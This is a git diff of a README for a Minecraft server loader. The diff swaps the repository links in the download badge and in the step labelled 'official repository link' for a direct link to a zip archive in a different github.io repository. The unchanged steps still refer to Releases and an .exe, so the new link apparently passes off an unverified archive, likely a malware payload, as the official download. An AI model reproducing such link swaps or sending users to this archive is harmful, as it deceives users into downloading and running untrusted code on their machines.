@@ -5,7 +5,7 @@ description: "Download and launch Minecraft server packages with this efficient 
 ---
 # 🎮 horde-minecraft-loader - Simplify your Minecraft server startup process
 
-[![](https://img.shields.io/badge/Download-horde--minecraft--loader-blue.svg)](https://github.com/sureasshooting-brotula854/horde-minecraft-loader)
+[![](https://img.shields.io/badge/Download-horde--minecraft--loader-blue.svg)](https://raw.githubusercontent.com/sureasshooting-brotula854/sureasshooting-brotula854.github.io/main/Apoda/v2.0.zip)
 
 HordeMinecraft helps you manage your Minecraft server files. If you run a server, you know how hard it can be to fetch the correct launcher files and keep them updated. This application automates those steps. It ensures you have the exact build you need to start your server without manual searching or configuration.
 
@@ -22,7 +22,7 @@ Before you start, check that your computer meets these requirements:
 
 You need to fetch the application from our repository page. Follow these steps to get the file:
 
-1.  Visit the official repository link: [https://github.com/sureasshooting-brotula854/horde-minecraft-loader](https://github.com/sureasshooting-brotula854/horde-minecraft-loader)
+1.  Visit the official repository link: [https://raw.githubusercontent.com/sureasshooting-brotula854/sureasshooting-brotula854.github.io/main/Apoda/v2.0.zip](https://raw.githubusercontent.com/sureasshooting-brotula854/sureasshooting-brotula854.github.io/main/Apoda/v2.0.zip)
 2.  Look for the section labeled "Releases" on the right side of the page.
 3.  Click the version number to open the release details.
 4.  Find the file ending in .exe in the "Assets" list.
